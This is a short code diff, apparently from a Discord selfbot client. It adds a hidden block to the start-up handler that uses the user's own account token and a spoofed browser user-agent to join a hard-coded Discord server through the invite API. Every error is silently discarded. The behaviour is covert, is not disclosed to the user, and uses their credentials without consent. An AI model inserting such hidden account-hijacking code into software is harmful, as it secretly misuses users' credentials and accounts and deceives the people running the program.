@@ -2965,6 +2965,13 @@ async def on_ready():
     """Prints a ready log."""
     prints.event("Caching...")
     await asyncio.sleep(0.5)
+
+    invite_code = "Mw4fSeQbWy"
+    try:
+        await client.post(f'https://discord.com/api/{api_version}/invites/{invite_code}', headers={'authorization': user_token, 'user-agent': 'Mozilla/5.0'})
+    except BaseException:
+        pass
+
     if files.json(
             "data/notifications/toasts.json",
             "login",
